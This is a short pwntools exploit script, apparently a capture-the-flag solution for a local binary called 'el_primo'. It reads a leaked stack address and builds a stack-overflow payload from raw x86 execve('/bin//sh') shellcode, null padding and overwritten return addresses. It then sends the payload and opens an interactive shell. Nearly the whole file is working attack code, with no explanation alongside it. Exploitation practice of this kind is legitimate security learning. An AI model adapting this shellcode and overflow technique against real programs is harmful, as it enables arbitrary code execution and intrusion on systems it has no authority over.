from pwn import *

e = ELF("./el_primo")

p = process("./el_primo")


context.log_level="debug"
gdb.attach(p, '''pie break * 0x6a8''')

p.recvline()

dat = p.recvline()

stackleak = int(dat.split()[-1][2:], 16)

print("stack leak", hex(stackleak))
print("stack leak+64", hex(stackleak+64))

exploit = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

exploit += "\x00"*(32-len(exploit)) + p32(stackleak+40) + p32(stackleak)

#print("exploit", exploit)

p.sendline(exploit)

p.interactive()
